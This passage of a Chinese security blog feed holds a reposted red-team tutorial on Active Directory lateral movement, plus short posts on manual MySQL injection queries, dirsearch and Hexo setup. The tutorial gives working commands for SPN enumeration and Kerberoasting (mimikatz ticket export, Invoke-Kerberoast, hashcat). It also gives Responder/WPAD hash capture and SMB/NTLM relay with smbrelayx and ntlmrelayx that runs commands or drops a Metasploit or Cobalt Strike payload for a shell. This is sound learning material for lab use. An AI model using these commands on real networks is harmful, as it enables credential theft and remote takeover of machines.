id="spn介绍">SPN介绍</h2><p>Kerberos认证过程使用SPN将<strong>服务实例</strong>与<strong>服务登录账户</strong>相关联，如果想使用Kerberos协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。一个用户账户下可以有多个SPN，但一个SPN只能注册到一个账户。在内网中，SPN扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN的识别是kerberoasting攻击的第一步。SPN分为两种类型：</p><ul><li>注册在活动目录机器(Computers)当一个服务的权限为 Local System 或Network Service，则SPN注册在机器帐户(Computers)下。</li><li>注册在活动目录的域用户账户(Users),当一个服务的权限为一个域用户，则SPN注册在域用户下</li></ul><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649139672420-8bb3a7f2-4e54-4d2c-9da9-c6b73f72f4b8.png"><imgsrc="域内横向移动基础/1649139672420-8bb3a7f2-4e54-4d2c-9da9-c6b73f72f4b8.png"alt="image.png" /></a></p><h2 id="spn的用法">SPN的用法</h2><p>0 注册一个SPN setspn -S MSSQLSvc/w2k8.hacker.lab user1 1查看当前域内所有的SPN： setspn -Q <em>/</em> 2查看指定域hacker.lab注册的SPN：setspn -T hacker.lab -Q <em>/</em>如果指定域不存在，则默认切换到查找本域的SPN 3 查找本域内重复的SPN：setspn -X 4 删除指定SPN：setspn -D SQLServer/w2k8.hacker.lab:1433 user25 查找指定用户/主机名注册的SPN：setspn -L username/hostname 6 zh</p><h2 id="spn作用举例">SPN作用举例</h2><p>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询SPN为MySQL的记录。当找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给客户，并将需要访问的SPN发送给KDC。KDC中的TGS服务对TGT进行解密。确认无误后，由TGS将一张允许访问该SPN所对应的服务的ST服务票据和该SPN所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</p><h2 id="spn信息收集">SPN信息收集</h2><h3 id="setspn">setspn</h3><p>Windows系统自带的setspn可以查询域内的SPN，前提是域任意的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">setspn -q */* <br>setspn -T hacker.lab -q */*<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649141590941-d4f4eef9-1af8-43c2-83e9-233436b847a4.png"><imgsrc="域内横向移动基础/1649141590941-d4f4eef9-1af8-43c2-83e9-233436b847a4.png"alt="image.png" /></a></p><h3 id="getuserspns">GetUserSPNs</h3><p>GetUserSPNs 是 Kerberoast 工具集中的一个 powershell脚本，用来查询域内注册的 SPN。 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649141765040-d307e3cb-4eae-41ec-b1bd-4d24c2723312.png"><imgsrc="域内横向移动基础/1649141765040-d307e3cb-4eae-41ec-b1bd-4d24c2723312.png"alt="image.png" /></a></p><h3 id="powerview">PowerView</h3><p>PowerView 是由 Will Schroeder（https://twitter.com/harmj0y）开发的Powershell 脚本，在 Powersploit 和 Empire 工具里都有集成，PowerView相对于上面几种是根据不同用户的 objectsid 来返回，返回的信息更加详细</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-module</span> .\powerview.ps1<br><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-SPN</span><br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649142004102-9348dc43-9219-4485-a105-d21ed48529e2.png"><imgsrc="域内横向移动基础/1649142004102-9348dc43-9219-4485-a105-d21ed48529e2.png"alt="image.png" /></a></p><h2 id="kerberoasting">Kerberoasting</h2><p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client端获取的票据 ST，从而获得 Server 端的密码。根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起kerberos 请求，申请 ST 票据。</p><h3 id="kerberoasting攻击一">Kerberoasting攻击一</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Add-Type -AssemblyName System.IdentityModel  <br>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/w2k8.hacker.lab:1433&quot;<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649144235185-c3f93515-230d-4b65-a29c-aa72c11a3d62.png"><imgsrc="域内横向移动基础/1649144235185-c3f93515-230d-4b65-a29c-aa72c11a3d62.png"alt="image.png" /></a> Kerberos 协议中请求的票据会保存在内存中，可以通过klist 命令查看当前会话存储的 kerberos 票据。 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649144279911-1e25bf8b-03e1-4a62-89a2-9393f63bf0d3.png"><imgsrc="域内横向移动基础/1649144279911-1e25bf8b-03e1-4a62-89a2-9393f63bf0d3.png"alt="image.png" /></a> 使用 mimikatz 导出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kerberos::list /export<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649144365137-e9819ef0-2da2-4e1f-8b99-8d2ea946f145.png"><imgsrc="域内横向移动基础/1649144365137-e9819ef0-2da2-4e1f-8b99-8d2ea946f145.png"alt="image.png" /></a> 使用 kerberoast 工具集中的 tgsrepcrack.py工具进行离线爆破，一搜就有了。</p><h3 id="kerberoasting攻击二">Kerberoasting攻击二</h3><p>Kerberoasting攻击方式一中需要通过 mimikatz从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成John the Ripper 或者 HashCat 能够直接爆破的字符串。 使用Invoke-Kerberoast 脚本 (这里使用的是 Empire 中的Invoke-Kerberoast.ps1)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Import-module Invoke-Kerberoast.ps1<br>Invoke-kerberoast -outputformat hashcat |fl<br></code></pre></td></tr></table></figure><p>–outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat两种格式 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649149076272-68a90606-d9eb-46a3-93bc-64c49d69a653.png"><imgsrc="域内横向移动基础/1649149076272-68a90606-d9eb-46a3-93bc-64c49d69a653.png"alt="image.png" /></a> 使用 HASHCAT 工具进行破解： <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649151306386-8116b5e4-8f50-4ff9-a03d-e5ac81df4e5d.png"><imgsrc="域内横向移动基础/1649151306386-8116b5e4-8f50-4ff9-a03d-e5ac81df4e5d.png"alt="image.png" /></a></p><h1 id="ntlm-relay">NTLM-Relay</h1><p>上面都是主动性的攻击，那么NTLM-Relay就是被动式的。在这个NTLMRelay中，我们就是要将截获的Net-NTLMHash重放来进行攻击，从而实现对其他机器的控制，所以严格意义上应该叫作Net-NTLMRelay。为看重放这个Net-NTLM-Relay，首先我们得获取这个Net-NTLM-Hash。由于SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash。然后一下思路</p><h2 id="利用llmnr和netbios">利用LLMNR和NetBIOS</h2><p>简单介绍一下这两个</p><h3 id="llmnr">LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的DNS 服务器不可用时，DNS 客户端就会使用 LLMNR解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。 从 Windows Vista开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR也支持 IPv6</p><h3 id="netbios">NetBIOS</h3><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址。 从 WindowsNT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持IPv6.</p><hr /><p>也就是说缓存中找不到，dns也请求失败的话，windwos就会从LLMNR和NetBIOS中解析。这时候客户端就会将未经身份验证的UDP广播到网络询问是否是本地系统名称，从而允许网络上的任何机器响应并声称是目标机器，所以我们就可以利用工具伪装从而让受害者交出凭证。</p><h3 id="利用">利用</h3><p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的Net-NTLM 哈希值。 Responder项目地址：https://github.com/lgandx/Responder Responder 不支持Windows，这里使用 Kali 进行演示。 Kali监听着 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649761370954-14444077-c5b3-4239-89c6-802e90a1d85c.png"><imgsrc="域内横向移动基础/1649761370954-14444077-c5b3-4239-89c6-802e90a1d85c.png"alt="image.png" /></a> win7去连接 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649761340329-d3dd8dfe-9740-4b7f-bf7c-d54bc11abbcb.png"><imgsrc="域内横向移动基础/1649761340329-d3dd8dfe-9740-4b7f-bf7c-d54bc11abbcb.png"alt="image.png" /></a> 如上图所示我们就获取到了Net-NTLMhash了然后就可以使用hashcat等进行破解 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649761667279-eacdefea-5ada-4ff0-a268-9de699a5be99.png"><imgsrc="域内横向移动基础/1649761667279-eacdefea-5ada-4ff0-a268-9de699a5be99.png"alt="image.png" /></a></p><h2 id="利用wpad">利用WPAD</h2><p>WPAD网络代理自动发现协议是一种客户端使用DCHP、DNS、LLMNR、NBNS协议来定位一个代理配置文件(PAC)URL的方法。WPAD通过让浏览器<strong>自动发现代理服务器</strong>，查找存放PAC文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。也就是说你上网的配置，如果游览器设置了自动检测，客户端上网的时候就会问，谁是WPAD服务器，然后拿这个pac去上网。</p><h3 id="攻击手法v1">攻击手法V1</h3><p>例如我们游览器访问一个网站，如果输错了一个域名。默认一般就是提示法访问或者错的。那我们现在伪造wpad服务的话。kali监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">python Responder.py -I eth0 -wFb<br>//这里使用-b参数强制使用401认证<br>客户端访问一个不存在的域名时会跳出登录框<br></code></pre></td></tr></table></figure><p>游览器需要自动检测代理 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649763561901-fcdd2e66-9e55-4695-ae86-0293ace88ee9.png"><imgsrc="域内横向移动基础/1649763561901-fcdd2e66-9e55-4695-ae86-0293ace88ee9.png"alt="image.png" /></a> 然后访问任意域名 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649763602553-bf9e9816-1ea5-4f35-8477-78f0a7990a61.png"><imgsrc="域内横向移动基础/1649763602553-bf9e9816-1ea5-4f35-8477-78f0a7990a61.png"alt="image.png" /></a> <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649763657127-99ca3ddc-a6c5-4f23-b861-3ec8db06af4d.png"><imgsrc="域内横向移动基础/1649763657127-99ca3ddc-a6c5-4f23-b861-3ec8db06af4d.png"alt="image.png" /></a></p><h3 id="攻击手法v2">攻击手法V2</h3><p>最重要的不过还是权限。大家应该知道smbrelay，但是这个漏洞很早就在MS08-068补丁中被修复了。但是这个不妨碍我们在未校验smb签名等情况下进行NTLM-Relay转发。我们执行responder，首先关闭掉smb，给接下来的ntlmrelayx使用。<ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649768051528-368c1c4c-c345-4739-a8b8-50f92c29f913.png"><imgsrc="域内横向移动基础/1649768051528-368c1c4c-c345-4739-a8b8-50f92c29f913.png"alt="image.png" /></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python Responder.py -I eth0<br>python3 ntlmrelayx.py  -t 1.1.1.1 -l ./<br></code></pre></td></tr></table></figure><p>当访问不存在的机器的时候。会中继到域控机器从而拿到hash <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649768248618-353163e6-423b-4bc5-8355-d3d03ac62927.png"><imgsrc="域内横向移动基础/1649768248618-353163e6-423b-4bc5-8355-d3d03ac62927.png"alt="image.png" /></a>为啥不Relay到其他域控，因为域内就域控默认开启smb签名。其他的机器是没有开的。</p><h1 id="smb-relay">SMB-Relay</h1><p>NTLM-Relay的话基本就是要破解hash。而Relay最有效的就是可以直接控制该服务器(包括但不限于在远程服务器上执行命令，上传exe到远程命令上执行，dump服务器的用户hash等等等等)。主要有两种场景详细见：https://www.anquanke.com/post/id/194069#h2-4</p><h2 id="工作组环境">工作组环境</h2><p>这个实用性比较差。在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码Hash只是保存在自己的SAM文件中，这个时候Relay到别的机器，除非两台机器的账号密码一样(如果账号密码一样，我为啥不直接pth呢)，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。因此微软在ms08-068中对smbreflect到 smb 做了限制，防止了同一主机从SMB协议向SMB协议的Net-NTLMhashrelay。这个补丁在CVE-2019-1384(Ghost Potato)被绕过。</p><h2 id="域环境">域环境</h2><p>域环境底下域用户的账号密码Hash保存在域控的ntds.dit里面。如下没有限制域用户登录到某台机子，那就可以将该域用户Relay到别人的机子，或者是拿到域控的请求，将域控Relay到普通的机子，比如域管运维所在的机子。(为啥不Relay到其他域控，因为域内就域控默认开启smb签名)</p><h2 id="responder中的multirelayx.py">Responder中的MultiRelayx.py</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 MultiRelay.py -t &lt;被攻击ip&gt; -u ALL<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649772463307-58e62aee-155b-4e09-968c-aadf1ac00e10.png"><imgsrc="域内横向移动基础/1649772463307-58e62aee-155b-4e09-968c-aadf1ac00e10.png"alt="image.png" /></a> 现在 SMB 已经由 MultiRelay.py脚本来进行中继，我们需要修改一下responder的配置文件Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 Responder.py -I eth1<br></code></pre></td></tr></table></figure><p>在DC随便传递一个SMB流量<ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649772526037-33484a14-d1f0-4c97-a324-7ef4b7510608.png"><imgsrc="域内横向移动基础/1649772526037-33484a14-d1f0-4c97-a324-7ef4b7510608.png"alt="image.png" /></a> 另一边直接拿到Shell <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649772552366-ae97452b-3ed9-411b-99dd-0bfbe08de392.png"><imgsrc="域内横向移动基础/1649772552366-ae97452b-3ed9-411b-99dd-0bfbe08de392.png"alt="image.png" /></a></p><h2 id="impacket中的smbrelayx.py">Impacket中的smbrelayx.py</h2><p>首先运行如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 smbrelayx.py -h &lt;被攻击的IP&gt; -c Command<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1649772974762-81c85264-75d3-4cc5-97fc-e999a47142d2.png"><imgsrc="域内横向移动基础/1649772974762-81c85264-75d3-4cc5-97fc-e999a47142d2.png"alt="image.png" /></a> 然后我们在在任意一台机器访问我们的恶意SMB服务器就是我们这个Kali</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net use \\1.1.1.11<br></code></pre></td></tr></table></figure><p>就如上图所示直接回显命令，实战中大多是我们直接生成一个msf的木马,然后使用-e参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 smbrelayx.py -h &lt;被攻击的IP&gt; -e ./shell.exe<br></code></pre></td></tr></table></figure><p>在监听msf会话的时候需要注意的是，我们要设置set AutoRunScriptmigrate在成功得到session后自动迁移进程，如果没有自动迁移进程，那么在Removingfile的时候，会话也随之关闭了。</p><h2 id="impcaket中的ntlmrelayx.py">Impcaket中的ntlmrelayx.py</h2><p>上面NTML-Relay提到过这个但是只是Hash的利用。这里我们使用一些参数进行Shell的获取。或者其他命令回显也是OK的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python Responder.py -I eth0<br>python3 ntlmrelayx.py  -t 1.1.1.1 -c &quot;CS生成Powershell的脚本&quot;<br></code></pre></td></tr></table></figure><h1 id="kerberos票据传递及其委派攻击">Kerberos票据传递及其委派攻击<ahref="https://www.cnblogs.com/R0ser1/p/16154463.html#kerberos票据传递及其委派攻击">#</a></h1><p>kerberos的票据传递可以查看https://www.cnblogs.com/R0ser1/p/16086323.htmlKerberos委派攻击可以查看https://www.cnblogs.com/R0ser1/p/16154451.html</p><h1 id="exchange邮件">Exchange邮件</h1><p>等后面环境搭了再补上吧，其中还有几个cve的大杀器</p><h1 id="参考">参考</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA<br>https://www.anquanke.com/post/id/194069#h2-4<br>https://www.freebuf.com/articles/244375.html<br>https://teamssix.com/211027-163641.html#toc-heading-101<br>https://www.freebuf.com/articles/network/251364.html<br>https://github.com/chriskaliX/AD-Pentest-Notes<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;转载自：https://www.cnblogs.com/R0ser1/p/16154463.html&lt;/p&gt;
&lt;h1 id=&quot;利用windwos远程连接&quot;&gt;利用Windwos远程连接&lt;/h1&gt;
&lt;h2 id=&quot;ipc&quot;&gt;IPC&lt;/h2&gt;
&lt;p&gt;IPC可以通过验证用户名和密码</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://blog.njcit.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="渗透测试" scheme="https://blog.njcit.me/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>MySQL手动注入笔记</title>
    <link href="https://blog.njcit.me/2023/06/29/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/MySQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.njcit.me/2023/06/29/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/MySQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</id>
    <published>2023-06-29T06:34:54.000Z</published>
    <updated>2023-06-29T01:09:15.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>大部分情况下都能sqlmap一把梭，当然也有不能一把梭的地方这时候就需要手动进行注入了。</p><h1 id="基础">基础</h1><p>获取当前用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br></code></pre></td></tr></table></figure><p>查询当前版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span><br></code></pre></td></tr></table></figure><p>查询当前数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> database()<br></code></pre></td></tr></table></figure><p>查询当前用户权限下的所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>已知数据库名查询表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<br></code></pre></td></tr></table></figure><p>查询字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;大部分情况下都能sqlmap一把梭，当然也有不能一把梭的地方这时候就需要手动进行注入了。&lt;/p&gt;
&lt;h1 id=&quot;基础&quot;&gt;基础&lt;/h1&gt;
&lt;p&gt;获取当前用户&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;tab</summary>
      
    
    
    
    
    <category term="注入, MySQL" scheme="https://blog.njcit.me/tags/%E6%B3%A8%E5%85%A5-MySQL/"/>
    
  </entry>
  
  <entry>
    <title>dirsearch使用</title>
    <link href="https://blog.njcit.me/2023/06/12/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/dirsearch%E4%BD%BF%E7%94%A8/"/>
    <id>https://blog.njcit.me/2023/06/12/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/dirsearch%E4%BD%BF%E7%94%A8/</id>
    <published>2023-06-12T00:51:30.000Z</published>
    <updated>2023-06-21T09:04:25.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>渗透无非就是三板斧，扫目录，漏扫，弱口令，第一步当然要扫描目录，很早之前扫目录大家用的都是御剑，御剑太老了，而且扫描速率太快得得容易闪退，扫扫一些比较老得asp/aspx得站还可以，新的Java架构得网站就不得行了，字典也不得行，有新的专业扫描得工具<ahref="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>为何不用呢</p><h1 id="使用">使用</h1><h2 id="安装">安装</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch.git --depth <span class="hljs-number">1</span><br>cd dirsearch<br>pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure><p>如果pip安装版本冲突之类得，就把requirements.txt中的版本号去掉即可</p><h2 id="使用-1">使用</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 dirsearch<span class="hljs-selector-class">.py</span> -u https:<span class="hljs-comment">//target</span><br>python3 dirsearch<span class="hljs-selector-class">.py</span> -e php,<span class="hljs-selector-tag">html</span>,js -u https:<span class="hljs-comment">//target</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 dirsearch.py -e php,html,js -u https:<span class="hljs-regexp">//</span>target -w <span class="hljs-regexp">/path/</span>to/wordlist<br></code></pre></td></tr></table></figure><h1 id="参考文档">参考文档</h1><ul><li>https://github.com/maurosoria/dirsearch/tree/master</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;渗透无非就是三板斧，扫目录，漏扫，弱口令，第一步当然要扫描目录，很早之前扫目录大家用的都是御剑，御剑太老了，而且扫描速率太快得得容易闪退，扫扫一些比较老得asp/aspx得站还可以，新的Java架构得网站就不得行了，字典也不得行，有新</summary>
      
    
    
    
    
    <category term="dirsearch" scheme="https://blog.njcit.me/tags/dirsearch/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客调优</title>
    <link href="https://blog.njcit.me/2023/06/09/%E6%9D%82%E9%A1%B9/hexo%E5%8D%9A%E5%AE%A2%E8%B0%83%E4%BC%98/"/>
    <id>https://blog.njcit.me/2023/06/09/%E6%9D%82%E9%A1%B9/hexo%E5%8D%9A%E5%AE%A2%E8%B0%83%E4%BC%98/</id>
    <published>2023-06-09T00:55:19.000Z</published>
    <updated>2023-06-09T01:03:50.959Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决某些机场屏蔽22端口的问题">解决某些机场屏蔽22端口的问题</h1><p>修改.ssh/config如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host github.com<br>    Hostname ssh.github.com<br>    Port <span class="hljs-number">443</span><br>    <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br></code></pre></td></tr></table></figure><h1id="解决hexo默认渲染引擎导致单引号显示不正确的问题">解决hexo默认渲染引擎导致单引号显示不正确的问题</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo apt install pandoc<br>npm uninstall hexo-renderer-marked <span class="hljs-comment">--save</span><br>npm install hexo-renderer-pandoc <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>编辑 <code>主题配置文件</code>，修改配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Math Equations Render Support</span><br><span class="hljs-attr">math:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-comment"># Default (true) will load mathjax / katex script on demand.</span><br>  <span class="hljs-comment"># That is it only render those page which has `mathjax: true` in Front Matter.</span><br>  <span class="hljs-comment"># If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br>  <span class="hljs-attr">per_page:</span> <span class="hljs-literal">false</span><br><br>  <span class="hljs-attr">engine:</span> <span class="hljs-string">mathjax</span><br></code></pre></td></tr></table></figure><p>引号测试</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">&#x27;<span class="hljs-string">&quot;&quot;</span>&#x27;<br></code></pre></td></tr></table></figure><h1 id="参考链接">参考链接</h1><ul><li>https://github.com/hexojs/hexo-renderer-pandoc</li><li>https://battlele.com/blog-2/</li><li>https://www.wylu.me/posts/78c745f0/</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;解决某些机场屏蔽22端口的问题&quot;&gt;解决某些机场屏蔽22端口的问题&lt;/h1&gt;
&lt;p&gt;修改.ssh/config如下：&lt;/p&gt;
&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    
    <category term="hexo" scheme="https://blog.njcit.me/tags/hexo/"/>
    
    <category term="优化" scheme="https://blog.njcit.me/tags/%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>john爆破zip密码</title>
